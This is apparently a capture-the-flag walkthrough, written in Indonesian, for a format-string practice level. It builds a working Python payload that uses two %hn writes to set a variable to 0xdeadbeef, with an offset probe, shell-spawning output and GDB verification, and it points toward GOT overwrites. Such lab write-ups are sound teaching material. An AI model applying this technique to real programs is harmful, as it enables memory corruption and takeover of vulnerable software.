# Walkthrough: Level 3 - Precise Write (`%hn`)
**Author**: Kenshin Himura

## Objective
Menulis nilai **tepat** `0xdeadbeef` ke variable `target` menggunakan dua kali `%hn`.

## Konsep Dasar

**Kenapa butuh `%hn`?**
- `%n` menulis 4 byte sekaligus -> harus print milyaran karakter jika nilainya besar
- `%hn` menulis **2 byte** -> maksimum 65535 karakter -> lebih manageable

**Teknik Double-Write:**
```
4-byte value:  0xDEADBEEF
                ├────┤├────┤
                upper lower
                (2byte)(2byte)

Write 1: tulis 0xBEEF ke target_addr     (lower) via %hn
Write 2: tulis 0xDEAD ke target_addr + 2 (upper) via %hn
```

**Payload Structure:**
```
[addr_low 4B] [addr_high 4B] %{low-8}x%{offset}$hn %{delta}x%{offset+1}$hn
 ├── 8 bytes printed ──┤├─ padding ─┤├─ %hn #1 ─┤├─ padding ─┤├─ %hn #2 ─┤
```

## Step-by-Step

### 1. Compile
```bash
make level3
```

### 2. Dapatkan address target
```bash
$ ./format3
target @ 0x0804c040 (current: 0x11111111, target: 0xdeadbeef)
```

### 3. Hitung komponen
```
target_val  = 0xDEADBEEF
low_word    = 0xBEEF = 48879
high_word   = 0xDEAD = 57005
```

### 4. Temukan offset
```bash
$ echo 'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./format3
```
Offset ke awal payload: N

### 5. Bangun payload
```python
import struct

target_addr = 0x0804c040
offset = 7
target_val = 0xdeadbeef

low_word  = target_val & 0xffff          # 0xbeef = 48879
high_word = (target_val >> 16) & 0xffff  # 0xdead = 57005

# Addresses
addr_low  = struct.pack('<I', target_addr)      # offset N
addr_high = struct.pack('<I', target_addr + 2)  # offset N+1

bytes_printed = 8  # dua address = 8 bytes

# Width calculation: harus print sebanyak low_word karakter
# baru %hn menulis low_word ke target_addr
fmt_part1 = f'%{low_word - bytes_printed}x'
fmt_part2 = f'%{offset}$hn'

# Width calculation untuk upper word
# Jika high > low: delta = high - low
# Jika high < low: delta = high + 0x10000 - low (integer overflow trick)
if high_word > low_word:
    delta = high_word - low_word
    fmt_part3 = f'%{delta}x'
else:
    delta = high_word + 0x10000 - low_word
    fmt_part3 = f'%{delta}x'

fmt_part4 = f'%{offset+1}$hn'

payload = addr_low + addr_high + fmt_part1.encode() + fmt_part2.encode() + fmt_part3.encode() + fmt_part4.encode()
```

### 6. Exploit
```bash
$ python3 exploit3.py
[+] target == 0xdeadbeef!
[+] Exploit successful! Spawning shell...
$ 
```

### 7. Debug: verifikasi dengan GDB
```bash
$ gdb ./format3
(gdb) b *vuln+???   # breakpoint setelah printf
(gdb) r
(gdb) x/x &target
0x0804c040: 0xdeadbeef
```

## Edge Case: High < Low
Jika high_word (0xDEAD) lebih kecil dari low_word (0xBEEF)...

DEAD < BEEF? Tidak, DEAD (57005) > BEEF (48879). OK no issue.

Tapi jika misalnya kita overwrite dengan `0xBEEFDEAD`:
- low = 0xDEAD (57005)
- high = 0xBEEF (48879)
- high < low -> trik: print 0x10000 - (low - high) karakter = wrap-around

```python
if high_word < low_word:
    delta = high_word + 0x10000 - low_word
else:
    delta = high_word - low_word
```

## Variasi: 4 × `%hhn` (byte-by-byte)
Lebih presisi, payload lebih besar:
```
[addr+0] [addr+1] [addr+2] [addr+3] %{byte0-16}x%{off}$hhn %{delta1}x%{off+1}$hhn ...
```

## Ringkasan
- Menulis 32-bit address: pakai 2 x `%hn` atau 4 x `%hhn`
- Ordering: low half-word dulu, baru upper half-word
- `%hn` -> maksimum 65535 karakter yang perlu di-print
- Teknik ini dipakai untuk GOT overwrite di level 4

## Automation
```bash
python3 exploit3.py
```
